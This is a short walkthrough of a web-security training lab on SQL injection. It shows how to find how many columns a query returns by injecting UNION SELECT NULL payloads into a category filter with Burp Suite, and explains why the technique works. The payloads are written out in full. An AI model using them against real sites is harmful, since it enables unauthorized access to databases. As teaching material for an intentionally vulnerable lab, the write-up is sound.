âœ… Lab: SQL injection UNION attack, determining the number of columns returned by the query
ðŸ§ª Steps:
Access the Lab â€“ Open the lab and make sure Burp Suite is set up to intercept traffic.
Go to any category, for example, Accessories.
In Burp, capture the request for Accessories.
 Send the captured request to the Repeater.
 Example request:
GET /filter?category=Accessories HTTP/2
Now, inject a payload to find the number of columns by modifying the category parameter.
 Start with:
Accessories' UNION SELECT NULL--
 cpp
CopyEdit
Accessories' UNION SELECT NULL--
Send the request. If you get an Internal Server Error, it means the number of columns doesn't match yet.
Increment the number of NULLs:
 Accessories' UNION SELECT NULL, NULL--
 Accessories' UNION SELECT NULL, NULL, NULL--
 Accessories' UNION SELECT NULL, NULL, NULL, NULL--
Repeat until you get an HTTP 200 OK response and a normal page (no server error).


The number of NULLs you needed is the number of columns returned by the original query.


âœ¨ Pro Tip:
You can also inject the payload directly in the URL from the browser, after selecting any category.
Example:
https://your-lab-id.web-security-academy.net/filter?category=Accessories' UNION SELECT NULL,NULL--

ðŸ§  Why This Works:
UNION combines the results of two queries.
The number of columns and their data types must match in both queries.
Adding the correct number of NULLs satisfies the database's structure, avoiding errors.
